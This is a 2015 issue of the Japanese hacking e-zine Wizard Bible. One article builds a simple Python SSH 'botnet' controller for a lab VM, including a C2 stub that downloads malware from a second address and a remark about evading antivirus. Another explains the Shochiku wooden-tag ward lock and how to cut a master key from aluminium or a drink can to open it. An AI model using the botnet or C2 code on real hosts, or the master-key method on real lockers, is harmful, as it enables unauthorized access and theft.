@@ -1,0 +1,761 @@
+[-]=======================================================================[-]
+
+                      Wizard Bible vol.60 (2015,4,20)
+
+[-]=======================================================================[-]
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+---- 第0章：目次 ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○第1章: Pythonで始める簡易ボットネット構築                      黒林檎 著
+
+○第2章: 松竹錠の構造と解錠                                    IPUSIRON 著
+
+○第3章: お知らせ
+
+○第4章: 著者プロフィール
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第1章: Pythonで始める簡易ボットネット構築 ---
+
+著者：黒林檎
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) 最初に
+
+　今回はPythonベースのマルウェアについて触れてみたいなと思います。
+　もちろんですが、コマンド＆コントロールサーバへの接続や、キーボードおよ
+びマウスイベントをフックとするキーロガーなどもPythonで作成することができ
+ます。
+　スクリプトベースで作成する主な理由はウイルス検出を避けるためです。一般
+にウイルスとしての検出率は低くなる傾向があるといわれています。
+
+　今回はSSHで命令を送る簡易ボットネットを作成します。
+　ボットネットというと凄い技術みたいな感じですね。簡単にまとめてしまうと
+複数台のパソコンをSSHで一気に操作するコントローラーの作成です。なので命令
+実行側はSSHが必須です。手軽に実行出来るので、拡張して遊んでみてください。
+
+
+■0x02.) Test環境構築
+
+・パソコンA（命令送るパソコン）
+　命令送信はSSHを使用するためpxsshというモジュールを手に入れておいてくだ
+さい。
+
+http://pexpect.sourceforge.net/pxssh.html
+
+・仮想環境（Vmwareやvagrantなどでも可、命令実行役）
+	[ISO]
+	お好みのOSのISOで可
+	[boxファイル]
+	Ubuntu boxダウンロードリンク
+	https://cloud-images.ubuntu.com/vagrant/trusty/current/
+
+・パソコンB（必須では無い、命令実行役）
+
+　ここでvagrantで仮想環境を作成します。
+　vagrantをここで使用する主な目的は、環境を簡単に（好みの状態で）作成でき
+るからです。こうしたことにこだわらなければ、VirtualBoxやVmwareなどといっ
+たvagrant以外の仮想環境を使用しても問題ありません。
+
+　前提として、先ほどのUbuntuのboxファイルをダウンロードして、任意のディレ
+クトリにあることとします。
+
+-----
+$vagrant box add ubuntu00 [boxファイルへの絶対パス]
+----
+
+○vagrant up手順メモ
+
+-----
+r00tapple@ubuntu:~/ubuntu$ vagrant box add ubuntu /home/r00tapple/Downloads/trusty-server-cloudimg-i386-vagrant-disk1.box
+Downloading or copying the box...
+Extracting box...te: 205M/s, Estimated time remaining: --:--:--)
+Successfully added box 'ubuntu' with provider 'virtualbox'!
+
+r00tapple@ubuntu:~/ubuntu$ vagrant init
+A `Vagrantfile` has been placed in this directory. You are now
+ready to `vagrant up` your first virtual environment! Please read
+the comments in the Vagrantfile as well as documentation on
+`vagrantup.com` for more information on using Vagrant.
+r00tapple@ubuntu:~/ubuntu$ vagrant up
+Bringing machine 'default' up with 'virtualbox' provider...
+There are errors in the configuration of this machine. Please fix
+the following errors and try again:
+
+vm:
+* The box 'base' could not be found.
+-----
+
+　「vagrant box add」は成功しましたが、「vagrant up」には失敗しました。こ
+れはbaseなんて物は存在しないというエラーなのでvagrantfileを少し書き換える
+必要があります。
+　書き換える部分がvagrantfileにあるかだけ無駄足を踏まないように確認しまし
+ょう。
+
+○確認
+
+-----
+r00tapple@ubuntu:~/ubuntu$ strings Vagrantfile | grep base
+  config.vm.box = "base"
+  # the file base.pp in the manifests_path directory.
+-----
+
+-----
+config.vm.box = "base"
+-----
+
+を
+
+-----
+config.vm.box = "ubuntu00"
+-----
+
+に書き換えればvagrant upが成功します。
+
+-----
+r00tapple@ubuntu:~/ubuntu$ vagrant box list
+ubuntu (virtualbox)
+r00tapple@ubuntu:~/ubuntu$ vi Vagrantfile
+r00tapple@ubuntu:~/ubuntu$ vagrant up
+Bringing machine 'default' up with 'virtualbox' provider...
+[default] Importing base box 'ubuntu'...
+[default] Matching MAC address for NAT networking...
+[default] Setting the name of the VM...
+以下略
+-----
+
+　次にSSH接続するためにvagrantfileの設定を書き直します。
+
+-----
+r00tapple@ubuntu:~/ubuntu$ strings Vagrantfile | grep 192.168.
+#config.vm.network :private_network, ip: "192.168.33.10"
+-----
+
+　はい。「config.vm.network」の先頭にあるコメントアウトである「#」を消し
+てください。
+　vagrantに好きなユーザーを作成してください。
+
+-----
+vagrant@vagrant$useradd
+vagrant@vagrant$adduser
+-----
+
+　好きなユーザーを作成し、パスワードなど設定しておいてください（後々使用
+します）。
+
+　この状態でSSH接続ができるかを確認してみます。
+
+○接続
+
+-----
+r00tapple@ubuntu:~/script/pybot$ ssh -l guest 192.168.33.10
+guest@192.168.33.10's password: 
+Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-48-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Thu Mar 26 17:51:31 UTC 2015
+
+  System load:  0.01              Processes:           78
+  Usage of /:   2.7% of 39.34GB   Users logged in:     2
+  Memory usage: 16%               IP address for eth0: 10.0.2.15
+  Swap usage:   0%                IP address for eth1: 192.168.33.10
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+  Get cloud support with Ubuntu Advantage Cloud Guest:
+    http://www.ubuntu.com/business/services/cloud
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Thu Mar 26 17:51:33 2015 from 192.168.33.1
+guest@vagrant-ubuntu-trusty-32:~$
+-----
+
+　ここまでできればtest環境の作成は終了です。
+
+※ただ、設定によってはデフォルトではパスワード認証ができないようにしてあ
+る場合もあるのでお気を付けください。
+
+
+■0x03.) pxsshについて
+
+　pxsshはこれはログイン、ログアウトするためのメソッドを追加し、シェルを手
+に入れることができます。
+
+-----
+http://pexpect.sourceforge.net/pxssh.html
+ import pxssh
+    import getpass
+    try:            
+    	#接続設定                                                
+        s = pxssh.pxssh()
+        hostname = raw_input('hostname: ')
+        username = raw_input('username: ')
+        password = getpass.getpass('password: ')
+        s.login (hostname, username, password)
+
+        #uptimeコマンド
+        s.sendline ('uptime')  #コマンド実行
+        s.prompt()             #プロンプト
+        print s.before         #実行結果
+
+        #lsコマンド
+        s.sendline ('ls -l')
+        s.prompt()
+        print s.before
+
+        #dfコマンド
+        s.sendline ('df')
+        s.prompt()
+        print s.before
+
+        #ログアウトとエラー処理
+        s.logout()
+    except pxssh.ExceptionPxssh, e:
+        print "pxssh failed on login."
+        print str(e)
+-----
+
+　pxsshについての操作方法を学習したところでコントローラーの作成について触
+れたいと思います。
+
+
+■0x04.) Pythonコントローラーの作成
+
+-----
+import pxssh
+
+class Client:
+
+    def __init__(self, host, user, password):
+        self.host = host
+        self.user = user
+        self.password = password
+        self.session = self.connect()
+
+    def connect(self):
+        try:
+            sec = pxssh.pxssh()
+            sec.login(self.host, self.user, self.password)
+            return sec
+        except Exception, e:
+            print e
+            print '[-] Error Connect'
+
+    def send_command(self, cmd):
+        self.session.sendline(cmd)
+        self.session.prompt()
+        return self.session.before
+
+
+def botnetCommand(command):
+    for client in botNet:
+        output = client.send_command(command)
+        print '[*] Output from ' + client.host
+        print '[+] ' + output 
+
+
+def addClient(host, user, password):
+    client = Client(host, user, password)
+    clientlist.append(client)
+
+clientlist = []
+#addClient('127.0.0.1', 'r00tapple', 'toor')
+addClient('192.168.33.10', 'guest', 'toor')
+
+botnetCommand('uname -a')
+botnetCommand('ping  127.0.0.1')
+#botnetCommand('好きなコマンド')
+-----
+
+　やっている事は単純で、先ほどのpxsshの使い方と似た部分も多いですね。
+
+○pxsshについてから
+
+-----
+        s = pxssh.pxssh()
+        hostname = raw_input('hostname: ')
+        username = raw_input('username: ')
+        password = getpass.getpass('password: ')
+        s.login (hostname, username, password)
+-----
+
+　「def __init__(self, host, user, password):」を定義、接続先をclientlis
+tに書いて、「connect(self):」で接続ですね。
+　「def send_command(self, cmd):」が先ほどの、#uptimeコマンドなどにあたり
+ます。
+　基本的に難しい部分がないと思います。
+
+　今回は配列でクライアントを定義していますが、CSV形式のデータを読み取る方
+法でも良いと思います。
+
+-----
+import csv
+	clientlist = "client.csv"
+	csvfile = open(filename)
+	reader = csv.reader(csvfile)
+	for row in csv.reader(csvfile):
+		for elem in row:
+			value = elem
+			addClient(value)
+-----
+
+　このように、CSVデータをからクライアントデータ（192.168.33.10', 'guest',
+ 'toor'）をaddClientに投げます。
+
+　他にも拡張できそうな部分として、次が挙げられます。
+
+-----
+import urllib2
+#def access():
+	add = "アドレス"
+	try:
+		sub1 = urlopen("address1")
+		sub2 = sub1.read()
+		print code2
+		if int(code2) == 1:
+			sub3 = urlopen("address2")
+			sub4 = sub3.read()
+			return sub4
+		else:
+			return add
+	except:
+			return add
+			pass
+-----
+
+　命令部分の拡張として、C2サーバーの例としてaddress1からデータ（ここでい
+うと1）というデータをダウンロードした場合if文が実行され、address2にアクセ
+スし、外部からマルウェアをダウンロードします。
+　1で無い場合（ここでは0が望ましい）はelseが実行されます。
+
+
+■0x05.) 実行
+
+　それではスクリプトを実行させてみます。
+
+-----
+r00tapple@ubuntu:~/script/pybot$ python pyBot.py
+[*] Output from 127.0.0.1
+[+] ping -c 3 www.google.com
+PING www.google.com (173.194.117.209) 56(84) bytes of data.
+64 bytes from nrt04s11-in-f17.1e100.net (173.194.117.209): icmp_seq=1 ttl=128 time=14.0 ms
+
+[*] Output from 192.168.33.10
+[+] ping -c 3 www.google.com
+PING www.google.com (173.194.117.209) 56(84) bytes of data.
+64 bytes from 173.194.117.209: icmp_seq=1 ttl=63 time=7527 ms
+64 bytes from 173.194.117.209: icmp_seq=2 ttl=63 time=6530 ms
+64 bytes from 173.194.117.209: icmp_seq=3 ttl=63 time=5531 ms
+
+--- www.google.com ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 5531.118/6529.671/7527.775/815.137 ms, pipe 3
+
+[*] Output from 127.0.0.1
+[+] ping -c 3 www.google.com
+PING www.google.com (173.194.117.209) 56(84) bytes of data.
+64 bytes from nrt04s11-in-f17.1e100.net (173.194.117.209): icmp_seq=1 ttl=128 time=14.0 ms
+64 bytes from nrt04s11-in-f17.1e100.net (173.194.117.209): icmp_seq=2 ttl=128 time=14.3 ms
+64 bytes from 173.194.117.209: icmp_seq=3 ttl=128 time=13.9 ms
+
+--- www.google.com ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 15194ms
+rtt min/avg/max/mdev = 13.966/14.130/14.332/0.180 ms
+
+[*] Output from 192.168.33.10
+[+] ls
+...
+-----
+
+　拡張的にはwget使ってぐちゃぐちゃっていう感じとか面白いと思います。
+
+-----
+[*] Output from 192.168.33.10
+[+] pwd
+/home/guest
+
+[*] Output from 192.168.33.10
+[+] wget http://nmap.org/dist/nmap-5.61TEST5.tar.bz2
+--2015-03-26 22:04:41--  http://nmap.org/dist/nmap-5.61TEST5.tar.bz2
+Resolving nmap.org (nmap.org)... 
+173.255.243.189, 2600:3c01::f03c:91ff:fe70:d085
+Connecting to nmap.org (nmap.org)|173.255.243.189|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 21500913 (21M) [application/x-bzip2]
+Saving to: ‘nmap-5.61TEST5.tar.bz2’
+
+100%[====================================>] 21,500,913   149KB/s   in 92s    
+
+2015-03-26 15:09:43 (229 KB/s) - ‘nmap-5.61TEST5.tar.bz2’ saved [21500913/21500913]
+-----
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第2章: 松竹錠の構造と解錠 ---
+
+著者：IPUSIRON
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) 松竹錠
+
+　松竹錠とは松竹錠工業が開発した、縦に木製の鍵を入れて解錠する錠前です（
+図1参照）。木製の鍵を木札や番号札といいます。
+
+（図1：http://wizardbible.org/60/images/syoutiku_lock.jpg）松竹錠
+
+　構造としてはウォード錠に分類されます。
+　ウォード錠とは、障害物をよけて通る鍵だけにより施解錠することがができる
+錠前です。鍵に対する障害物のことをウォード（ward）と呼びます。
+　合鍵だけがすべてのウォードを避けて回り切ることができ、デッドボルトを操
+作することができます。一方、合鍵以外の鍵の場合は、いずれかのウォードにぶ
+つかってしまい回りきることができないため、デッドボルトが操作することがで
+きません。
+
+　木札は大きいため、居酒屋で酔っていても鍵がわかりやすいというメリットが
+あります。盗難を防止するだけではなく、酔って他人の靴を履いていくことを防
+止することができます。
+　一組の値段が4,500～7,000円であり、他の下駄箱用の錠前と比べて高いです。
+
+　昭和27年に株式会社になり、同年に松竹錠の特許を取りました。そして、昭和
+29年に発売して以来、大ヒット商品になりました。古くからある銭湯で下駄箱の
+錠前として使用されてきました。当時は戦後であったため、物資が不足しており、
+よく靴が盗まれたという背景がありました。松竹錠の登場以前は、銭湯で盗まれ
+ても被害を最小限にするために、家中で最もひどい履物を履いていったといいま
+す。
+　盗難という意味では、靴以外にも衣服も同様です。昔は衣服を入れるために籠
+を使っていました。その後、昭和35年頃に関西から化粧板を使ったロッカーが普
+及し始めました。東京では、昭和37年頃には銭湯にロッカーが設置され始めまし
+た。ロッカーの普及により、衣服の盗難も少なくなりました。
+
+　すかいらーく系列の和食の店である藍屋に導入されたことが、飲食店で利用さ
+れた第一号だといいます。その後は居酒屋などで使用され、近年では大手居酒屋
+チェーンでも採用しています。
+
+　松竹錠は「松竹錠」という刻印の方向が正しくなるように、縦に取り付けます。
+木札を外すと、重力により閂が落ち、施錠します（図2参照）。例えば、下駄箱で
+あれば、松竹錠を下駄箱の開く扉側、受け座を戸枠側に取り付けます。ただし、
+写真では閂が見やすいように横にしています。
+
+（図2：http://wizardbible.org/60/images/syoutiku1.jpg）松竹錠の施錠時
+
+　番号（あるいは文字）が一致する木札を松竹錠に挿入すると、閂が戻り、解錠
+します。
+
+　木札の裏側は、鍵山が掘られています（図3参照）。表の番号によって、鍵山が
+異なります。
+
+（図3：http://wizardbible.org/60/images/syoutiku_lock_key.jpg）松竹錠の鍵（裏側）
+
+　左側の木札は一部欠けていますが、解錠には支障ありません。その理由は後ほ
+どわかります。
+
+　松竹錠の番号は1番から144番まであります。
+　なぜならば、男用の下駄箱が72個（＝8段×9列）、女用の下駄箱が72個で、合
+計144個だからです。120以上なければ、保健所の許可が通らなかったため、この
+数になったといいます。
+　オリジナルの松竹錠は原理として180通りの鍵違いを作れます。そのため、144
+個の木札はすべて鍵違いにできます。
+
+　靴を入れるちょうどよい高さにある木札はよく使われるため、なくなりやすい
+傾向にありました。そのため、風呂屋に松竹錠を納入する際には、1つの錠前に対
+して、紛失に備えて2枚の木札を納めていました。
+
+
+■0x02.) 松竹錠の分解
+
+1：松竹錠の本体の両脇に鋲が存在します（図1参照）。しっかりペンチでつまみ、
+左右に回転することでねじ切ることができます。
+
+（図1：http://wizardbible.org/60/images/syoutiku2.jpg）鋲の位置
+
+2：鋲の先端だけが取り外されます。穴に鋲の棒の一部が残り、錠前をばらすこと
+ができません。
+　そこで、すきまにペンチの先端を入れて、てこの原理により、錠前の前面部を
+取り外します（図2参照）。
+
+（図2：http://wizardbible.org/60/images/syoutiku3.jpg）前面部を取り外そうとするところ
+
+3：前面部を取り外すと、内部にウォードが存在することがわかります。左側が錠
+前本体、右側が前面部になります（図3参照）。
+
+（図3：http://wizardbible.org/60/images/syoutiku4.jpg）前面部を取り外したところ
+
+4：錠前本体を裏返すと、上部にリベット接合しているところがあります。ここを
+平ヤスリで削り、錠前本体をさらに分解することができます（図4参照）。
+
+（図4：http://wizardbible.org/60/images/syoutiku5.jpg）リベット接合のヤスリがけ
+
+5：錠前本体から裏蓋を取り外すと、内部に2つの金具が円柱にはまっています（
+図5参照）。
+
+（図5：http://wizardbible.org/60/images/syoutiku6.jpg）裏蓋を取り外したところ
+
+　この金具が動作することで、施解錠が制御
+
+6：2つの金具を取り外すと、松竹錠の分解は完了です（図6参照）。
+
+（図6：http://wizardbible.org/60/images/syoutiku7.png）2つの金具を取り外したところ
+
+　内部は2つの金具だけだけで構成されており、非常にシンプルです。
+　通常の錠前は内部にばねを利用していることが多いですが、松竹錠では1本のば
+ねさえも使用していません。
+
+
+■0x03.) 松竹錠の構造
+
+　施錠時の内部構造は次の通りです（図7参照）。
+
+（図7：http://wizardbible.org/60/images/syoutiku8.png）施錠時の内部構造
+
+　合鍵である木札を上から挿入すると、内部にある左右の円柱に当たります。そ
+のまま円柱が下がると、閂が引っ込みます（図8参照）。
+
+（図8：http://wizardbible.org/60/images/syoutiku10.jpg）木札を挿入したところ
+
+　合鍵ではない木札を挿入すると、木札がウォードに引っ掛かり、円柱を完全に
+下げることができません。
+　また、合鍵を挿入しないで、松竹錠の外側から指などで閂を上げようとしても、
+上がりません。
+
+　木札の裏側には鍵山があります。鍵山が正しい位置に存在すると、ウォードを
+避けて、奥までしっかりと挿入できます。
+　鍵山の上部は斜めにカットされていますが、これは鍵山を掘るという加工をし
+やすくするために存在し、斜めにカットされずに垂直にカットされていても、解
+錠には影響しません（図9参照）。
+
+（図9：http://wizardbible.org/60/images/syoutiku21.png）木札の鍵山とウォードの関係
+
+　ウォード錠の鍵（歯型）でもウォードを避けることができるため、解錠するこ
+とができます。しかし、素材が木材であるため、ビットに相当する部分が割れる
+可能性があります。そのため、完全に歯型にせずに、裏側だけを掘り込んでいる
+のです。
+　それでも隣り合う鍵山の間が短い場合は、欠けやすいです。画像の木札の右側
+の鍵山も一部欠けています。欠ける分にはウォードに当たるわけではないので、
+解錠には影響しません。
+
+　左右にある円柱のうち、円柱A（左側の円柱）が若干下に移動しないと、円柱B
+（右側の円柱）は下がりません。
+　円柱Aを持つ金具を金具A、円柱Bを持つ金具を金具Bと呼ぶことにします。する
+と、金具Aと金具Bが内部でどうなっているかを確認するとわかります。裏蓋を開
+けて、金具を確認すると次のようになっています（図9参照）。裏蓋側から見てい
+るため、AとBの位置は先ほどの画像と逆になります。
+
+（図9：http://wizardbible.org/60/images/syoutiku9.png）施錠時の金具Aと金具Bの状態
+
+　円柱Aと円柱Bの水平位置は若干ずれています。円柱Aの方が円柱Bよりも上に位
+置します。そのため、合鍵である木札を挿入すると、最初に円柱Aに当たり、下に
+移動します。すると軸を中心に金具の先端が上がります。金具Aの先端が先に上が
+れば、金具Bの先端も上がることができます。しかし、金具Aの先端が上がってい
+なければ、金具Bの先端である凸部は金具Aの凹部にはまり、動きません。
+
+　解錠時の円柱や金具の状態は次の通りです（図10、図11参照）。
+
+（図10：http://wizardbible.org/60/images/syoutiku12.jpg）解錠時の円柱Aと円柱Bの状態
+（図11：http://wizardbible.org/60/images/syoutiku11.jpg）解錠時の金具Aと金具Bの状態
+
+　円柱が下がり切っており、閂が錠前の内部に引っ込んでいる様子がわかります。
+
+
+■0x04.) 松竹錠のマスターキーの作成
+
+　単純に松竹錠を解錠するだけであれば、受け座を取り外した方が手っ取り早い
+でしょう。受け座は戸枠に対して、剥き出しにネジで取り付けられています。
+
+　松竹錠にはマスターキーが存在して、マスターキーだけでも販売されています。
+実売価格は2,000円程度です。
+
+　「複数の木札の裏側の鍵山の位置と大きさ」と「ウォード錠の特徴」から、木
+札の両端だけを残して、真ん中を切り抜けばマスターキーとして機能すると推測
+できます。さらには松竹錠の木札の挿入口から内部を観察することで、内部の2本
+の円柱だけに当たり、ウォードに当たらない形状であればよいので、上記の推測
+は確信になりました。
+　松竹錠以外でも、ウォードを持つ錠前であれば、共通の考え方でマスターキー
+を作成できる可能性が高いです。
+
+　マスターキーを木材で作成するのであれば、厚さを考慮する必要があります。
+正規の木札の厚さは10mmです。これと同じか、これよりも薄い厚さであれば、錠
+前に問題なく挿入することができます。
+
+　次に、マスターキーの形状は次の寸法に合わせてカットします（図1参照）。
+
+（図1：http://wizardbible.org/60/images/syoutiku_master1.png）マスターキーの寸法
+
+　寸法に合っていて、比較的硬いものであれば、木材以外でも、塩ビ板（下敷き
+でも代用可能）や金属板などでマスターキーを作ることができます。
+　ここでは、HIKARIのアルミ板（100×300mm、厚み0.3mm）を加工します（図2参
+照）。ホームセンターで158円で購入しました。
+
+（図2：http://wizardbible.org/60/images/syoutiku_master2.jpg）加工対象のアルミ板
+
+　0.3mm程度であれば、普通のハサミでもカットすることができます。今回使用し
+たアルミ板は高さが100mmなので、マスターキーの高さを100mmに調整しました。
+そして、残りの部分に関しては上記に提示した寸法に合うように、マジックで印
+を付けます（図3参照）。
+
+（図3：http://wizardbible.org/60/images/syoutiku_master3.jpg）印を付けたところ
+
+　後は印を合わせてハサミなどでカットするだけです。
+
+　完成したマスターキーを松竹錠に挿入します。その際、奥の壁面に合わせた状
+態で挿入します。すると、閂が引っ込み、解錠します（図4参照）。
+
+（図4：http://wizardbible.org/60/images/syoutiku_master4.jpg）マスターキーによる解錠
+
+　マスターキーを用いて解錠しているとき、内部状態では次のようになります（
+図5参照）。完全にウォードを影響することなく、2本の円柱に当たっています。
+
+（図5：http://wizardbible.org/60/images/syoutiku_master5.jpg）マスターキーによる解錠時の内部状態
+
+　レッドブルを加工してマスターキーを作成して、解錠できるかどうかを確かめ
+てみました。しかし、板が薄すぎるため、円柱を押す力に負け、板が曲がってし
+まい、解錠に到りませんでした。
+　そこで、二つ折りにして、加工してみたところ、解錠することができました（
+図6参照）。折り返したところがちょうど両端の円柱にぶつかっても、復元力の方
+が勝るため、円柱が下がるためです。
+
+（図6：http://wizardbible.org/60/images/syoutiku30.jpg）レッドブルで作成した松竹錠のマスターキー
+
+
+■0x05.) 松竹錠の新旧
+
+　松竹錠工業が販売してた松竹錠にも旧型と新型が存在します（図1参照）。
+
+（図1：http://wizardbible.org/60/images/syoutiku22.png）旧型と新型の比較
+
+　松竹錠の前面にある「松竹錠」という刻印の上に「PTxxxx-xxxxx」（xは数値）
+という型番のような刻印の有無で識別できます。存在すれば旧型、存在しなけれ
+ば新型になります。
+　また、数字の上の模様や「松竹錠」という刻印のエンボスの深さ、周囲の枠の
+彫りの深さに差で識別できます。彫りが深ければ旧型、浅ければ新型になります。
+
+　次のURLによると、旧型と新型のどちらが普及しているかがわかります。
+
+http://www5e.biglobe.ne.jp/~wadyfarm/gesokujo.html
+
+　執筆時点（2014年11月）では、旧型が52個、新型が7個になっています。圧倒的
+に旧型の方が普及しているようです。
+
+
+■0x06.) オリジナルではない松竹錠
+
+　松竹錠の大ヒットにより、松竹錠工業以外でも同等の錠前を販売しています。
+「松竹錠」という刻印がないものがオリジナル以外となります。
+　松竹錠は大きく、取り付け場所を制限します。また、素材や製造のコストがか
+かります。そのため、松竹錠の登場以降は、本質的な錠前の原理は同等である風
+呂屋錠などが登場しました。
+
+　次のWebページでは、温泉や銭湯の松竹錠の写真を収集しています。
+
+http://www.kt.rim.or.jp/~tsukasa/sento/subete/gesoku/gesoku.htm
+http://www.kt.rim.or.jp/~tsukasa/sento/subete/keys.htm
+
+　非常に多くの種類が存在することがわかります。
+
+　その中には横刺しタイプの松竹錠が存在します（図1参照）。オリジナルの松竹
+錠は重力を利用するため、木札を縦に刺します。分解して確かめたわけではない
+ので推測になりますが、横刺しということは、内部にばねを持つと予測できます。
+
+（図1：http://wizardbible.org/60/images/syoutiku_y01.jpg）横刺しタイプの松竹錠
+
+　取り付ける場合は、閂の出る方向を意識する必要があります。右側に閂を出す
+場合は左吊タイプ、左側に閂を出す場合は右吊タイプを購入します。
+　例えば、右側に閂を出すときに右吊タイプを使用しても、施錠という意味では
+問題ありませんが、錠前や鍵に印字されている数字の向きが逆さになってしまい
+ます。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+ --- 第3章: お知らせ ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
+ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
+味の解説などでも構いません。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
+
+http://wizardbible.org/wbQandA.html
+
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  --- 第4章: 著者プロフィール ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+■黒林檎
+●Job: 自宅警備員
+●Web: http://profile.ameba.jp/r00tapple/
+●Web2: http://www.packr.org/
+●Twitter: @r00tapple
+●Mail: packr@packr.org
+●Comment:
+　IPUSIRONさん、ハッカーの学校無事出版おめでとうございます。
+　Kindle版ですが、同じくIPUSIRONさんが出してらっしゃるのでこちらも確認し
+てみてください。
+http://www.amazon.co.jp/%E6%9C%AC-IPUSIRON/s?ie=UTF8&page=1&rh=n%3A465392%2Cp_27%3AIPUSIRON
+　最近は、不正送金関係のネタを追っているので是非興味がある方は連絡してく
+ださい。
+　メインはマルウェアを使用した不正送金ですが、関連技術にも興味があります。
+
+
+■IPUSIRON
+●Job: 自宅警備員
+●Web: http://akademeia.info
+●Twitter: @ipusiron
+●Mail: ipusiron@gmail.com
+●Comment:
+　2015年から自宅警備員の傍らで、色々活動しております。
+・『ハッカーの学校』の出版
+http://s-akademeia.sakura.ne.jp/main/books/school/
+　出版当初はAmazonで在庫切れなどのトラブルなどがありましたが、皆さんのお
+かげで現在は4刷までいきました。
+・ハードウェア型キーロガー本とスマホ遠隔操作本の無料キャンペーン
+　最終的にKindleのPC書籍ランキング1位・2位に到達しました。
+http://www.amazon.co.jp/dp/B00OJ94DC4
+http://www.amazon.co.jp/gp/product/B00OORTYFW
+・まぼろし博覧会の「真夏の文化祭」の予定
+　8月にまぼろし博覧会で「真夏の文化祭」というイベントを開催します。『ハッ
+カーの学校』の出版記念として、「ハッカー教室」やジャンク即売会などを催す
+予定です。興味のある方は、次に示すURLを参照してください。
+http://usakoro.blogspot.jp/2015/04/blog-post.html
+
